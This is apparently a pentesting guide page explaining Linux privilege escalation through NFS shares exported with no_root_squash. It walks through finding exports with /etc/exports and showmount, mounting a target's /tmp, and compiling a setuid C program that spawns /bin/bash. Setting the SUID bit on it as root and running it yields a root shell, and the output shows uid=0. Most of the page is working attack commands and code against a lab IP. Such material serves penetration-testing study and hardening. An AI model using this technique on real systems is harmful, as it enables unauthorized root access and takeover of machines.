---
description: >-
  Sharing a fileserver over the network sometimes allows you to upload files as
  root and escalate privileges
---

# Network File Sharing (NFS)

## Finding NFS folders

To find a list of all configured NFS folders, just look in the `/etc/exports` file.&#x20;

```bash
cat /etc/exports
```

This file shows the directories paths, and the rules for sharing. An example would be the following:

```bash
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_subtree_check)
```

The danger here is the `no_root_squash` option. If you see this, it means that any files uploaded here will keep their root privileges. We can abuse this to upload programs that can be ran as root on the target machine.&#x20;

### Finding NFS folders from the outside

We can also find these locations from our host machine, but without the rules associated with them. Using the `showmount -e` command:

```bash
showmount -e 10.10.158.49
```

This will show a list of folders like this:

{% code title="$ showmount -e 10.10.158.49" %}
```bash
Export list for 10.10.158.49: 
/home/ubuntu/sharedfolder * 
/tmp * 
/home/backup *
```
{% endcode %}

## Uploading a SUID binary

The trick to exploiting this is to upload a **SUID** binary that executes the code we want. Then we can run it as the user we have on the target system and elevate to root privileges.&#x20;

We'll start by connecting to the target machine, by mounting it to a local folder. First make a folder somewhere that will be mounted to the target. Then mount it using the `mount` command to one of the targets folders with the `no_root_squash` set. Finally to make it easier for myself, I change the owner of the `target_tmp` directory on my host to my own user, because we created it with `sudo`.&#x20;

```bash
mkdir target_tmp
sudo mount -o rw 10.10.158.49:/tmp target_tmp/
sudo chown $USER:$(id -g) target_tmp/
```

{% hint style="info" %}
**Tip**: You can view your active mounts by looking at your `/proc/mounts` file. Then when you want to disconnect you can unmount the directory with the `umount` command.&#x20;
{% endhint %}

Now the `target_tmp` folder is connected to the target machine's `/tmp` directory. Then we can start on creating the malicious binary, that executes the `/bin/bash` command for example.&#x20;

{% code title="shell.c" %}
```c
int main() {
  setuid(0);
  setgid(0);
  system("/bin/bash");
  return 0;
}
```
{% endcode %}

Then we can compile it into the target directory. Make sure you use `sudo` for the `gcc` command to ensure that the file owner is root when we upload it.&#x20;

```bash
sudo gcc shell.c -o target_tmp/shell
```

Finally we need to set the SUID bit on this binary, to make sure that when we execute it our privileges get set to root.&#x20;

```bash
sudo chmod u+s target_tmp/shell
```

Now if we look on the target machine, we see that we have created a `shell` program that is owned by root, and has the SUID bit set (seen by the `s` in the permissions).

```shell-session
$ ls -laF /tmp/shell
-rwsr-xr-x 1 root root 16784 Feb 27 09:42 /tmp/shell*
   ^
```

This means we can now just run the `/tmp/shell` program on the target with our low-privilege user, to get a root shell.&#x20;

```shell-session
$ /tmp/shell
# id
uid=0(root) gid=0(root) groups=0(root)
```
